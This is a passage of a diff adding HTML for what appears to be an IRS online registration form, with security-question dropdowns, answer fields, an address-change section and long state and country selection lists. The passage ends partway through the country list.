+                <img width="1" height="10" alt=" " src="https://la1.www4.irs.gov/e-services/Registration/Images/1x1-transparent_spacer.gif" />
+               </td>
+              </tr>
+              <tr>
+               <td class="content-bold" colspan="2">
+                Please select one question to be answered 
+											by you if you forget your username and you attempt to re-register 
+											with IRS. The question and answer should be unlikely to be known 
+											by other individuals. For example, do not select your street where 
+											you currently live or the car you own today.
+               </td>
+              </tr>
+              <tr>
+               <td width="1%" align="right" class="form-field-name-required">
+                <label for="question">
+                 *Question to Recover Username (Required): 
+                </label>
+               </td>
+               <td class="form-field-name-required">
+                <select id="question" size="1" name="question">
+                 <option value="What is your mother's date of birth?">
+                  What is your mother's date of birth?
+                 </option>
+                 <option value="What is your father's date of birth?">
+                  What is your father's date of birth?
+                 </option>
+                 <option value="What is your mother's maiden name?">
+                  What is your mother's maiden name?
+                 </option>
+                 <option value="What is the name of the first or only elementary school you attended?">
+                  What is the name of the first or only elementary school you attended?
+                 </option>
+                 <option value="What is the name of the street you first lived on?">
+                  What is the name of the street you first lived on?
+                 </option>
+                 <option value="What is the name of the hospital in which you were born?">
+                  What is the name of the hospital in which you were born?
+                 </option>
+                 <option value="What is the year/make/model of the first car you owned?">
+                  What is the year/make/model of the first car you owned?
+                 </option>
+                 <option value="What was the name of your first pet?">
+                  What was the name of your first pet?
+                 </option>
+                </select>
+               </td>
+              </tr>
+              <tr>
+               <td width="1%" align="right" class="form-field-name-required">
+                <label for="answer">
+                 *Answer (Required): 
+                </label>
+               </td>
+               <td class="form-field-name-required">
+                <input type="text" value="" id="answer" size="51" maxlength="50" name="answer" />
+               </td>
+              </tr>
+              <tr>
+               <td colspan="2">
+                <img width="1" height="10" alt=" " src="https://la1.www4.irs.gov/e-services/Registration/Images/1x1-transparent_spacer.gif" />
+               </td>
+              </tr>
+              <!-- UWR 83528 Changes Begin-->
+              <tr>
+               <td class="content-bold" colspan="2">
+                <br />
+                Questions to unlock your account
+                <br />
+               </td>
+              </tr>
+              <!-- Challenge Question 1 -->
+              <tr>
+               <td width="1%" nowrap="nowrap" align="right" class="form-field-name-required">
+                <label for="cquestion1">
+                 *Question 1 (Required): 
+                </label>
+               </td>
+               <td class="form-field-name-required">
+                <select id="cquestion1" size="1" name="cquestion1">
+                 <option value="In what city were you living at age 16?">
+                  In what city were you living at age 16?
+                 </option>
+                 <option value="What is the first name of your oldest niece/nephew?">
+                  What is the first name of your oldest niece/nephew?
+                 </option>
+                 <option value="What is your maternal grandmother's first name?">
+                  What is your maternal grandmother's first name?
+                 </option>
+                 <option value="What was the last name of your first grade teacher?">
+                  What was the last name of your first grade teacher?
+                 </option>
+                 <option value="What is the last name of the best man/maid of honor in your wedding?">
+                  What is the last name of the best man/maid of honor in your wedding?
+                 </option>
+                </select>
+               </td>
+              </tr>
+              <tr>
+               <td width="1%" align="right" class="form-field-name-required">
+                <label for="canswer1">
+                 *Answer 1 (Required): 
+                </label>
+               </td>
+               <td class="form-field-name-required">
+                <input type="text" value="" id="canswer1" size="51" maxlength="50" name="canswer1" />
+               </td>
+              </tr>
+              <!-- Challenge Question 2 -->
+              <tr>
+               <td width="1%" nowrap="nowrap" align="right" class="form-field-name-required">
+                <label for="cquestion2">
+                 *Question 2 (Required): 
+                </label>
+               </td>
+               <td class="form-field-name-required">
+                <select id="cquestion2" size="1" name="cquestion2">
+                 <option value="What was your high school mascot?">
+                  What was your high school mascot?
+                 </option>
+                 <option value="What is your oldest sibling's middle name?">
+                  What is your oldest sibling's middle name?
+                 </option>
+                 <option value="What was your first phone number?">
+                  What was your first phone number?
+                 </option>
+                 <option value="In what city or town was your first job?">
+                  In what city or town was your first job?
+                 </option>
+                 <option value="What is your maternal grandfather's first name?">
+                  What is your maternal grandfather's first name?
+                 </option>
+                </select>
+               </td>
+              </tr>
+              <tr>
+               <td width="1%" align="right" class="form-field-name-required">
+                <label for="canswer2">
+                 *Answer 2 (Required): 
+                </label>
+               </td>
+               <td class="form-field-name-required">
+                <input type="text" value="" id="canswer2" size="51" maxlength="50" name="canswer2" />
+               </td>
+              </tr>
+              <!-- Challenge Question 3 -->
+              <tr>
+               <td width="1%" nowrap="nowrap" align="right" class="form-field-name-required">
+                <label for="cquestion3">
+                 *Question 3 (Required): 
+                </label>
+               </td>
+               <td class="form-field-name-required">
+                <select id="cquestion3" size="1" name="cquestion3">
+                 <option value="What was your childhood nickname?">
+                  What was your childhood nickname?
+                 </option>
+                 <option value="What is the first name of your spouse's oldest sibling?">
+                  What is the first name of your spouse's oldest sibling?
+                 </option>
+                 <option value="What was the first concert you attended?">
+                  What was the first concert you attended?
+                 </option>
+                 <option value="What was your favorite place to visit as a child?">
+                  What was your favorite place to visit as a child?
+                 </option>
+                 <option value="What is the last name of your favorite high school teacher?">
+                  What is the last name of your favorite high school teacher?
+                 </option>
+                </select>
+               </td>
+              </tr>
+              <tr>
+               <td width="1%" align="right" class="form-field-name-required">
+                <label for="canswer3">
+                 *Answer 3 (Required): 
+                </label>
+               </td>
+               <td class="form-field-name-required">
+                <input type="text" value="" id="canswer3" size="51" maxlength="50" name="canswer3" />
+               </td>
+              </tr>
+              <!-- UWR 83528 Changes End-->
+              <tr>
+               <td colspan="2">
+                <p class="content">
+                 The last address you provided the IRS on your 
+                individual tax return, Form 1040, 1040A, etc. or Change of Address, 
+                Form 8822, will be used to send you a confirmation 
+                number. You must provide us with your new
+                 <b>
+                  home
+                 </b>
+                 address 
+                if it has since changed. Upon confirmation of your Account update, 
+                we will update your taxpayer home address under your SSN only. 
+                If you last filed as a secondary taxpayer on a joint return, we 
+                will not update the address information under the primary SSN 
+                on the account.
+                </p>
+                <p class="content">
+                 <span class="content-bold">
+                  Has your taxpayer 
+                address changed as explained above?
+                 </span>
+                 <span class="form-field-name-required">
+                  <label for="addressChange">
+                   Yes
+                  </label>
+                  <input type="radio" value="Y" id="addressChange" name="addressChange" />
+                  <label for="addressChangeNo">
+                   No
+                  </label>
+                  <input type="radio" checked="checked" value="N" id="addressChangeNo" name="addressChange" />
+                 </span>
+                 <br />
+                 If yes, you must enter your new address in the fields below. If 
+                no, proceed to terms and conditions.
+                </p>
+                <p>
+                 <span class="content-bold">
+                  Warning!
+                 </span>
+                  Completing these fields will change your address of record with the IRS.
+                </p>
+                <br />
+               </td>
+              </tr>
+              <tr>
+               <td width="1%" align="right" class="form-field-name-required">
+                <label for="address1">
+                 Address Line: 
+                </label>
+               </td>
+               <td align="left">
+                <input type="text" value="" id="address1" size="36" maxlength="35" name="address1" />
+               </td>
+              </tr>
+              <!-- FJF 29APR2003 comment out address2 as per Dfct 9800
+                <tr> 
+
+
+
+                  <td class="form-field-name-required" width="1%" align="right" ><label for="address2">Address 
+
+
+
+                    2:&nbsp;</label></td>
+
+
+
+                  <td> 
+
+
+
+                    <input type="text" name="address2" maxlength=35 size="36" id="address2"  value=''>
+
+
+
+                  </td>
+
+
+
+                </tr>
+-->
+              <tr>
+               <td width="1%" align="right" class="form-field-name-required">
+                <label for="city">
+                 City
+                </label>
+                : 
+               </td>
+               <td>
+                <input type="text" value="" id="city" size="26" maxlength="25" name="city" />
+               </td>
+              </tr>
+              <tr>
+               <td width="1%" align="right" class="form-field-name-required">
+                <label for="state">
+                 State (USA Only): 
+                </label>
+               </td>
+               <td class="form-field-name-required">
+                <select id="state" size="1" name="state">
+                 <option value=" ">
+                 </option>
+                 <option value="AA">
+                  AA(Armed Forces Americas(except Canada))
+                 </option>
+                 <option value="AE">
+                  AE(Armed Forces Africa/Canada/Europe/Middle East)
+                 </option>
+                 <option value="AK">
+                  AK(Alaska)
+                 </option>
+                 <option value="AL">
+                  AL(Alabama)
+                 </option>
+                 <option value="AP">
+                  AP(Armed Forces Pacific)
+                 </option>
+                 <option value="AR">
+                  AR(Arkansas)
+                 </option>
+                 <option value="AS">
+                  AS(American Samoa)
+                 </option>
+                 <option value="AZ">
+                  AZ(Arizona)
+                 </option>
+                 <option value="CA">
+                  CA(California)
+                 </option>
+                 <option value="CO">
+                  CO(Colorado)
+                 </option>
+                 <option value="CT">
+                  CT(Connecticut)
+                 </option>
+                 <option value="DC">
+                  DC(District of Columbia)
+                 </option>
+                 <option value="DE">
+                  DE(Delaware)
+                 </option>
+                 <option value="FL">
+                  FL(Florida)
+                 </option>
+                 <option value="FM">
+                  FM(FEDERATED STATES OF MICRONESIA)
+                 </option>
+                 <option value="GA">
+                  GA(Georgia)
+                 </option>
+                 <option value="GU">
+                  GU(Guam)
+                 </option>
+                 <option value="HI">
+                  HI(Hawaii)
+                 </option>
+                 <option value="IA">
+                  IA(Iowa)
+                 </option>
+                 <option value="ID">
+                  ID(Idaho)
+                 </option>
+                 <option value="IL">
+                  IL(Illinois)
+                 </option>
+                 <option value="IN">
+                  IN(Indiana)
+                 </option>
+                 <option value="KS">
+                  KS(Kansas)
+                 </option>
+                 <option value="KY">
+                  KY(Kentucky)
+                 </option>
+                 <option value="LA">
+                  LA(Louisiana)
+                 </option>
+                 <option value="MA">
+                  MA(Massachusetts)
+                 </option>
+                 <option value="MD">
+                  MD(Maryland)
+                 </option>
+                 <option value="ME">
+                  ME(Maine)
+                 </option>
+                 <option value="MH">
+                  MH(MARSHALL ISLANDS)
+                 </option>
+                 <option value="MI">
+                  MI(Michigan)
+                 </option>
+                 <option value="MN">
+                  MN(Minnesota)
+                 </option>
+                 <option value="MO">
+                  MO(Missouri)
+                 </option>
+                 <option value="MP">
+                  MP(NORTHERN MARIANA ISLANDS)
+                 </option>
+                 <option value="MS">
+                  MS(Mississippi)
+                 </option>
+                 <option value="MT">
+                  MT(Montana)
+                 </option>
+                 <option value="NC">
+                  NC(North Carolina)
+                 </option>
+                 <option value="ND">
+                  ND(North Dakota)
+                 </option>
+                 <option value="NE">
+                  NE(Nebraska)
+                 </option>
+                 <option value="NH">
+                  NH(New Hampshire)
+                 </option>
+                 <option value="NJ">
+                  NJ(New Jersey)
+                 </option>
+                 <option value="NM">
+                  NM(New Mexico)
+                 </option>
+                 <option value="NV">
+                  NV(Nevada)
+                 </option>
+                 <option value="NY">
+                  NY(New York)
+                 </option>
+                 <option value="OH">
+                  OH(Ohio)
+                 </option>
+                 <option value="OK">
+                  OK(Oklahoma)
+                 </option>
+                 <option value="OR">
+                  OR(Oregon)
+                 </option>
+                 <option value="PA">
+                  PA(Pennsylvania)
+                 </option>
+                 <option value="PR">
+                  PR(Puerto Rico)
+                 </option>
+                 <option value="PW">
+                  PW(PALAU)
+                 </option>
+                 <option value="RI">
+                  RI(Rhode Island)
+                 </option>
+                 <option value="SC">
+                  SC(South Carolina)
+                 </option>
+                 <option value="SD">
+                  SD(South Dakota)
+                 </option>
+                 <option value="TN">
+                  TN(Tennessee)
+                 </option>
+                 <option value="TX">
+                  TX(Texas)
+                 </option>
+                 <option value="UT">
+                  UT(Utah)
+                 </option>
+                 <option value="VA">
+                  VA(Virginia)
+                 </option>
+                 <option value="VI">
+                  VI(Virgin Islands)
+                 </option>
+                 <option value="VT">
+                  VT(Vermont)
+                 </option>
+                 <option value="WA">
+                  WA(Washington)
+                 </option>
+                 <option value="WI">
+                  WI(Wisconsin)
+                 </option>
+                 <option value="WV">
+                  WV(West Virginia)
+                 </option>
+                 <option value="WY">
+                  WY(Wyoming)
+                 </option>
+                </select>
+               </td>
+              </tr>
+              <tr>
+               <td width="1%" align="right" class="form-field-name-required">
+                <label for="zipCode">
+                 Zip Code
+                </label>
+                : 
+               </td>
+               <td class="form-field-name-required">
+                <input type="text" value="" id="zipCode" size="13" maxlength="12" name="zipCode" />
+               </td>
+              </tr>
+              <tr>
+               <td width="1%" align="right" class="form-field-name-required">
+                <label for="countrySelection">
+                 Country
+                </label>
+                : 
+               </td>
+               <td>
+                <select id="countrySelection" size="1" name="countrySelection">
+                 <option value=" ">
+                 </option>
+                 <option value="United States">
+                  USA(United States)
+                 </option>
+                 <option value="Aruba">
+                  ABW(Aruba)
+                 </option>
+                 <option value="Afghanistan">
+                  AFG(Afghanistan)
+                 </option>
+                 <option value="Angola">
+                  AGO(Angola)
+                 </option>
+                 <option value="Anguilla">
+                  AIA(Anguilla)
+                 </option>
+                 <option value="Aland Islands">
+                  ALA(Aland Islands)
+                 </option>
+                 <option value="Albania">
+                  ALB(Albania)
+                 </option>
+                 <option value="Andorra">
+                  AND(Andorra)
+                 </option>
+                 <option value="United Arab Emirates">
+                  ARE(United Arab Emirates)
+                 </option>
+                 <option value="Argentina">
+                  ARG(Argentina)
+                 </option>
+                 <option value="Armenia">
+                  ARM(Armenia)
+                 </option>
+                 <option value="American Samoa">
+                  ASM(American Samoa)
+                 </option>
+                 <option value="Antarctica">
+                  ATA(Antarctica)
+                 </option>
+                 <option value="French Southern Territories">
+                  ATF(French Southern Territories)
+                 </option>
+                 <option value="Antigua and Barbuda">
+                  ATG(Antigua and Barbuda)
+                 </option>
+                 <option value="Australia">
+                  AUS(Australia)
+                 </option>
+                 <option value="Austria">
+                  AUT(Austria)
+                 </option>
+                 <option value="Azerbaijan">
+                  AZE(Azerbaijan)
+                 </option>
+                 <option value="Burundi">
+                  BDI(Burundi)
+                 </option>
+                 <option value="Belgium">
+                  BEL(Belgium)
+                 </option>
+                 <option value="Benin">
+                  BEN(Benin)
+                 </option>
+                 <option value="Bonaire, St Eustatius and Saba">
+                  BES(Bonaire, Saint Eustatius and Saba)
+                 </option>
+                 <option value="Burkina Faso">
+                  BFA(Burkina Faso)
+                 </option>
+                 <option value="Bangladesh">
+                  BGD(Bangladesh)
+                 </option>
+                 <option value="Bulgaria">
+                  BGR(Bulgaria)
+                 </option>
+                 <option value="Bahrain">
+                  BHR(Bahrain)
+                 </option>
+                 <option value="Bahamas">
+                  BHS(Bahamas)
+                 </option>
+                 <option value="Bosnia and Herzegovina">
+                  BIH(Bosnia and Herzegovina)
+                 </option>
+                 <option value="Saint Barthelemy">
+                  BLM(Saint Barthelemy)
+                 </option>
+                 <option value="Belarus">
+                  BLR(Belarus)
+                 </option>
+                 <option value="Belize">
+                  BLZ(Belize)
+                 </option>
+                 <option value="Bermuda">
+                  BMU(Bermuda)
+                 </option>
+                 <option value="Bolivia, Plurinational State">
+                  BOL(Bolivia, Plurinational State of)
+                 </option>
+                 <option value="Brazil">
+                  BRA(Brazil)
+                 </option>
+                 <option value="Barbados">
+                  BRB(Barbados)
+                 </option>
+                 <option value="Brunei Darussalam">
+                  BRN(Brunei Darussalam)
+                 </option>
+                 <option value="Bhutan">
+                  BTN(Bhutan)
+                 </option>
+                 <option value="Bouvet Island">
+                  BVT(Bouvet Island)
+                 </option>
+                 <option value="Botswana">
+                  BWA(Botswana)
+                 </option>
+                 <option value="Central African Republic">
+                  CAF(Central African Republic)
+                 </option>
+                 <option value="Canada">
+                  CAN(Canada)
+                 </option>
+                 <option value="Cocos (Keeling) Islands">
+                  CCK(Cocos (Keeling) Islands)
+                 </option>
+                 <option value="Switzerland">
+                  CHE(Switzerland)
+                 </option>
+                 <option value="Chile">
+                  CHL(Chile)
+                 </option>
+                 <option value="China">
+                  CHN(China)
+                 </option>
+                 <option value="Cote D'ivoire">
+                  CIV(Cote D'ivoire)
+                 </option>
+                 <option value="Cameroon">
+                  CMR(Cameroon)
+                 </option>
+                 <option value="Congo, The Dem. Republic of">
+                  COD(Congo, The Democratic Republic of the)
+                 </option>
+                 <option value="Congo">
+                  COG(Congo)
+                 </option>
+                 <option value="Cook Islands">
+                  COK(Cook Islands)
+                 </option>
+                 <option value="Colombia">
+                  COL(Colombia)
+                 </option>
+                 <option value="Comoros">
+                  COM(Comoros)
+                 </option>
+                 <option value="Cape Verde">
+                  CPV(Cape Verde)
+                 </option>
+                 <option value="Costa Rica">
+                  CRI(Costa Rica)
+                 </option>
+                 <option value="Cuba">
+                  CUB(Cuba)
+                 </option>
+                 <option value="Curacao">
+                  CUW(Curacao)
+                 </option>
+                 <option value="Christmas Island">
+                  CXR(Christmas Island)
+                 </option>
+                 <option value="Cayman Islands">
+                  CYM(Cayman Islands)
+                 </option>
+                 <option value="Cyprus">
+                  CYP(Cyprus)
+                 </option>
+                 <option value="Czech Republic">
+                  CZE(Czech Republic)
+                 </option>
+                 <option value="Germany">
+                  DEU(Germany)
+                 </option>
+                 <option value="Djibouti">
+                  DJI(Djibouti)
+                 </option>
+                 <option value="Dominica">
+                  DMA(Dominica)
+                 </option>
+                 <option value="Denmark">
+                  DNK(Denmark)
+                 </option>
+                 <option value="Dominican Republic">
+                  DOM(Dominican Republic)
+                 </option>
+                 <option value="Algeria">
+                  DZA(Algeria)
+                 </option>
+                 <option value="Ecuador">
+                  ECU(Ecuador)
+                 </option>
+                 <option value="Egypt">
+                  EGY(Egypt)
+                 </option>
+                 <option value="Eritrea">
+                  ERI(Eritrea)
+                 </option>
+                 <option value="Western Sahara">
+                  ESH(Western Sahara)
+                 </option>
+                 <option value="Spain">
+                  ESP(Spain)
+                 </option>
+                 <option value="Estonia">
+                  EST(Estonia)
+                 </option>
+                 <option value="Ethiopia">
+                  ETH(Ethiopia)
+                 </option>
+                 <option value="Finland">
+                  FIN(Finland)
+                 </option>
+                 <option value="Fiji">
+                  FJI(Fiji)
+                 </option>
+                 <option value="Falkland Islands (Malvinas)">
+                  FLK(Falkland Islands (Malvinas))
+                 </option>
+                 <option value="France">
+                  FRA(France)
+                 </option>
+                 <option value="Faroe Islands">
+                  FRO(Faroe Islands)
+                 </option>
+                 <option value="Micronesia, Federated States">
+                  FSM(Micronesia, Federated States of)
+                 </option>
+                 <option value="Gabon">
+                  GAB(Gabon)
+                 </option>
+                 <option value="United Kingdom">
+                  GBR(United Kingdom)
+                 </option>
+                 <option value="Georgia">
+                  GEO(Georgia)
+                 </option>
+                 <option value="Guernsey">
+                  GGY(Guernsey)
+                 </option>
+                 <option value="Ghana">
+                  GHA(Ghana)
+                 </option>
+                 <option value="Gibraltar">
+                  GIB(Gibraltar)
+                 </option>
+                 <option value="Guinea">
+                  GIN(Guinea)
+                 </option>
+                 <option value="Guadeloupe">
+                  GLP(Guadeloupe)
+                 </option>
+                 <option value="Gambia">
+                  GMB(Gambia)
+                 </option>
+                 <option value="Guinea-Bissau">
+                  GNB(Guinea-Bissau)
+                 </option>
+                 <option value="Equatorial Guinea">
+                  GNQ(Equatorial Guinea)
+                 </option>
+                 <option value="Greece">
+                  GRC(Greece)
+                 </option>
+                 <option value="Grenada">
+                  GRD(Grenada)
+                 </option>
+                 <option value="Greenland">
+                  GRL(Greenland)
+                 </option>
+                 <option value="Guatemala">
+                  GTM(Guatemala)
+                 </option>
+                 <option value="French Guiana">
+                  GUF(French Guiana)
+                 </option>
+                 <option value="Guam">
+                  GUM(Guam)
+                 </option>
+                 <option value="Guyana">
+                  GUY(Guyana)
+                 </option>
+                 <option value="Hong Kong">
+                  HKG(Hong Kong)
+                 </option>
+                 <option value="Heard Is and McDonald Is">
+                  HMD(Heard Island and McDonald Islands)
+                 </option>
+                 <option value="Honduras">
+                  HND(Honduras)
+                 </option>
+                 <option value="Croatia">
+                  HRV(Croatia)
+                 </option>
+                 <option value="Haiti">
+                  HTI(Haiti)
+                 </option>
+                 <option value="Hungary">
+                  HUN(Hungary)
+                 </option>
+                 <option value="Indonesia">
+                  IDN(Indonesia)
+                 </option>
+                 <option value="Isle of Man">
+                  IMN(Isle of Man)
+                 </option>
+                 <option value="India">
+                  IND(India)
+                 </option>
+                 <option value="British Indian Ocean Territory">
+                  IOT(British Indian Ocean Territory)
+                 </option>
+                 <option value="Ireland">
+                  IRL(Ireland)
+                 </option>
+                 <option value="Iran, Islamic Republic of">
+                  IRN(Iran, Islamic Republic of)
+                 </option>
+                 <option value="Iraq">
+                  IRQ(Iraq)
+                 </option>
+                 <option value="Iceland">
+                  ISL(Iceland)
+                 </option>
+                 <option value="Israel">
+                  ISR(Israel)
+                 </option>
+                 <option value="Italy">
+                  ITA(Italy)
+                 </option>
+                 <option value="Jamaica">
+                  JAM(Jamaica)
+                 </option>
+                 <option value="Jersey">
+                  JEY(Jersey)
+                 </option>
+                 <option value="Jordan">
+                  JOR(Jordan)
+                 </option>
+                 <option value="Japan">
+                  JPN(Japan)
+                 </option>
+                 <option value="Kazakhstan">
+                  KAZ(Kazakhstan)
+                 </option>
+                 <option value="Kenya">
+                  KEN(Kenya)
+                 </option>
+                 <option value="Kyrgyzstan">
+                  KGZ(Kyrgyzstan)
+                 </option>
+                 <option value="Cambodia">
+                  KHM(Cambodia)
+                 </option>
+                 <option value="Kiribati">
+                  KIR(Kiribati)
+                 </option>
+                 <option value="Saint Kitts And Nevis">
+                  KNA(Saint Kitts And Nevis)
+                 </option>
+                 <option value="Korea, Republic of">
+                  KOR(Korea, Republic of)
+                 </option>
+                 <option value="Kuwait">
+                  KWT(Kuwait)
+                 </option>
+                 <option value="Lao People's Democratic Rep.">
+                  LAO(Lao People's Democratic Republic)
+                 </option>
+                 <option value="Lebanon">
+                  LBN(Lebanon)
+                 </option>
+                 <option value="Liberia">
+                  LBR(Liberia)
+                 </option>
+                 <option value="Libyan Arab Jamahiriya">
+                  LBY(Libyan Arab Jamahiriya)
+                 </option>
+                 <option value="Saint Lucia">
+                  LCA(Saint Lucia)
+                 </option>
+                 <option value="Liechtenstein">
+                  LIE(Liechtenstein)
+                 </option>
+                 <option value="Sri Lanka">
+                  LKA(Sri Lanka)
+                 </option>
+                 <option value="Lesotho">
+                  LSO(Lesotho)
+                 </option>
+                 <option value="Lithuania">
+                  LTU(Lithuania)
+                 </option>
+                 <option value="Luxembourg">
+                  LUX(Luxembourg)
+                 </option>
+                 <option value="Latvia">
+                  LVA(Latvia)
+                 </option>
+                 <option value="Macao">
+                  MAC(Macao)
+                 </option>
+                 <option value="Saint Martin (French Part)">
+                  MAF(Saint Martin (French Part))
+                 </option>
+                 <option value="Morocco">
+                  MAR(Morocco)
+                 </option>
+                 <option value="Monaco">
+                  MCO(Monaco)
+                 </option>
+                 <option value="Moldova, Republic of">
+                  MDA(Moldova, Republic of)
+                 </option>
+                 <option value="Madagascar">
+                  MDG(Madagascar)
+                 </option>
+                 <option value="Maldives">
+                  MDV(Maldives)
+                 </option>
+                 <option value="Mexico">
+                  MEX(Mexico)
+                 </option>
+                 <option value="Marshall Islands">
+                  MHL(Marshall Islands)
+                 </option>
+                 <option value="Macedonia">
+                  MKD(Macedonia, The Former Yugoslav Republic of)
+                 </option>
+                 <option value="Mali">
+                  MLI(Mali)
+                 </option>
+                 <option value="Malta">
+                  MLT(Malta)
+                 </option>
+                 <option value="Myanmar">
+                  MMR(Myanmar)
+                 </option>
+                 <option value="Montenegro">
+                  MNE(Montenegro)
+                 </option>
+                 <option value="Mongolia">
+                  MNG(Mongolia)
+                 </option>
+                 <option value="Northern Mariana Islands">
+                  MNP(Northern Mariana Islands)
+                 </option>
+                 <option value="Mozambique">
+                  MOZ(Mozambique)
+                 </option>
+                 <option value="Mauritania">
+                  MRT(Mauritania)
+                 </option>
+                 <option value="Montserrat">
+                  MSR(Montserrat)
+                 </option>
+                 <option value="Martinique">
+                  MTQ(Martinique)
+                 </option>
+                 <option value="Mauritius">
+                  MUS(Mauritius)
+                 </option>
+                 <option value="Malawi">
+                  MWI(Malawi)
+                 </option>
+                 <option value="Malaysia">
+                  MYS(Malaysia)
+                 </option>
+                 <option value="Mayotte">
+                  MYT(Mayotte)
+                 </option>
+                 <option value="Namibia">
+                  NAM(Namibia)
+                 </option>
+                 <option value="New Caledonia">
+                  NCL(New Caledonia)
+                 </option>
+                 <option value="Niger">
+                  NER(Niger)
+                 </option>
+                 <option value="Norfolk Island">
+                  NFK(Norfolk Island)
+                 </option>
+                 <option value="Nigeria">
+                  NGA(Nigeria)
+                 </option>
+                 <option value="Nicaragua">
+                  NIC(Nicaragua)
+                 </option>
+                 <option value="Niue">
+                  NIU(Niue)
+                 </option>
+                 <option value="Netherlands">
+                  NLD(Netherlands)
+                 </option>
+                 <option value="Norway">
+                  NOR(Norway)
+                 </option>
+                 <option value="Nepal">
+                  NPL(Nepal)
+                 </option>
+                 <option value="Nauru">
+                  NRU(Nauru)
+                 </option>
+                 <option value="New Zealand">
+                  NZL(New Zealand)
+                 </option>
+                 <option value="Oman">
+                  OMN(Oman)
+                 </option>
+                 <option value="Pakistan">
+                  PAK(Pakistan)
+                 </option>
+                 <option value="Panama">
+                  PAN(Panama)
+                 </option>
+                 <option value="Pitcairn">
+                  PCN(Pitcairn)
+                 </option>
+                 <option value="Peru">
+                  PER(Peru)
+                 </option>
+                 <option value="Philippines">
+                  PHL(Philippines)
+                 </option>
+                 <option value="Palau">
+                  PLW(Palau)
+                 </option>
+                 <option value="Papua New Guinea">
+                  PNG(Papua New Guinea)
+                 </option>
+                 <option value="Poland">
+                  POL(Poland)
+                 </option>
+                 <option value="Puerto Rico">
+                  PRI(Puerto Rico)
+                 </option>
+                 <option value="Korea, Dem. People's Republic">
+                  PRK(Korea, Democratic People's Republic of)
+                 </option>
+                 <option value="Portugal">
+                  PRT(Portugal)
+                 </option>
+                 <option value="Paraguay">
+                  PRY(Paraguay)
+                 </option>
+                 <option value="Palestinian Terr., Occupied">
+                  PSE(Palestinian Territory, Occupied)
+                 </option>
+                 <option value="French Polynesia">
+                  PYF(French Polynesia)
+                 </option>
+                 <option value="Qatar">
+                  QAT(Qatar)
+                 </option>
+                 <option value="Reunion">
+                  REU(Reunion)
+                 </option>
+                 <option value="Romania">
+                  ROU(Romania)
+                 </option>
+                 <option value="Russian Federation">
+                  RUS(Russian Federation)
+                 </option>
+                 <option value="Rwanda">
+                  RWA(Rwanda)
+                 </option>
+                 <option value="Saudi Arabia">
+                  SAU(Saudi Arabia)
+                 </option>
+                 <option value="Sudan">
+                  SDN(Sudan)
+                 </option>
+                 <option value="Senegal">
+                  SEN(Senegal)
+                 </option>
+                 <option value="Singapore">
+                  SGP(Singapore)
+                 </option>
+                 <option value="S. Georgia and S. Sandwich Is.">
+                  SGS(South Georgia and the South Sandwich Islands)
+                 </option>
+                 <option value="Saint Helena">
+                  SHN(Saint Helena, Ascension And Tristan Da Cunha)
+                 </option>
+                 <option value="Svalbard And Jan Mayen">
+                  SJM(Svalbard And Jan Mayen)
+                 </option>
+                 <option value="Solomon Islands">
+                  SLB(Solomon Islands)
+                 </option>
+                 <option value="Sierra Leone">
+                  SLE(Sierra Leone)
+                 </option>
+                 <option value="El Salvador">
+                  SLV(El Salvador)
+                 </option>
+                 <option value="San Marino">
+                  SMR(San Marino)
+                 </option>
+                 <option value="Somalia">
+                  SOM(Somalia)
+                 </option>
+                 <option value="Saint Pierre And Miquelon">
+                  SPM(Saint Pierre And Miquelon)
+                 </option>
+                 <option value="Serbia">
+                  SRB(Serbia)
+                 </option>
+                 <option value="Sao Tome and Principe">
+                  STP(Sao Tome and Principe)
+                 </option>
+                 <option value="Suriname">
+                  SUR(Suriname)
+                 </option>
+                 <option value="Slovakia">
+                  SVK(Slovakia)
+                 </option>
+                 <option value="Slovenia">
+                  SVN(Slovenia)
+                 </option>
+                 <option value="Sweden">
+                  SWE(Sweden)
+                 </option>
+                 <option value="Swaziland">
+                  SWZ(Swaziland)
+                 </option>
+                 <option value="Sint Maarten (Dutch Part)">
+                  SXM(Sint Maarten (Dutch Part))
+                 </option>
+                 <option value="Seychelles">
+                  SYC(Seychelles)
+                 </option>
+                 <option value="Syrian Arab Republic">
+                  SYR(Syrian Arab Republic)
+                 </option>
+                 <option value="Turks and Caicos Islands">
+                  TCA(Turks and Caicos Islands)
+                 </option>
+                 <option value="Chad">
+                  TCD(Chad)
+                 </option>
+                 <option value="Togo">
+                  TGO(Togo)
+                 </option>
+                 <option value="Thailand">
+                  THA(Thailand)
+                 </option>
+                 <option value="Tajikistan">
+                  TJK(Tajikistan)
+                 </option>
+                 <option value="Tokelau">
+                  TKL(Tokelau)
+                 </option>
+                 <option value="Turkmenistan">
+                  TKM(Turkmenistan)
+                 </option>
+                 <option value="Timor-Leste">
+                  TLS(Timor-Leste)
+                 </option>
+                 <option value="Tonga">
+                  TON(Tonga)
+                 </option>
+                 <option value="Trinidad and Tobago">
+                  TTO(Trinidad and Tobago)
+                 </option>
+                 <option value="Tunisia">
+                  TUN(Tunisia)
+                 </option>
+                 <option value="Turkey">
+                  TUR(Turkey)
+                 </option>
+                 <option value="Tuvalu">
+                  TUV(Tuvalu)
+                 </option>
+                 <option value="Taiwan, Province of China">
+                  TWN(Taiwan, Province of China)
+                 </option>
+                 <option value="Tanzania, United Republic of">
+                  TZA(Tanzania, United Republic of)
+                 </option>
+                 <option value="Uganda">
+                  UGA(Uganda)
+                 </option>
+                 <option value="Ukraine">
+                  UKR(Ukraine)
+                 </option>
+                 <option value="U. S. Minor Outlying Islands">
+                  UMI(United States Minor Outlying Islands)
+                 </option>
+                 <option value="Uruguay">
+                  URY(Uruguay)
+                 </option>
+                 <option value="Uzbekistan">
+                  UZB(Uzbekistan)
+                 </option>
+                 <option value="Vatican City State">
+                  VAT(Vatican City State)
+                 </option>
+                 <option value="Vatican City State">
+                  VAT(Holy See (Vatican City State))
+                 </option>
+                 <option value="St Vincent And The Grenadines">
+                  VCT(Saint Vincent And The Grenadines)
+                 </option>
+                 <option value="Venezuela, Bolivarian Republic">
+                  VEN(Venezuela, Bolivarian Republic Of)
+                 </option>
+                 <option value="Virgin Islands, British">
+                  VGB(Virgin Islands, British)
+                 </option>
+                 <option value="Virgin Islands, U.S.">
+                  VIR(Virgin Islands, U.S.)
+                 </option>
+                 <option value="Viet Nam">
+                  VNM(Viet Nam)
+                 </option>
+                 <option value="Vanuatu">
+                  VUT(Vanuatu)
+                 </option>
+                 <option value="Wallis And Futuna">
+                  WLF(Wallis And Futuna)
+                 </option>
+                 <option value="Samoa">
+                  WSM(Samoa)
+                 </option>
+                 <option value="Yemen">
+                  YEM(Yemen)
+                 </option>
+                 <option value="South Africa">
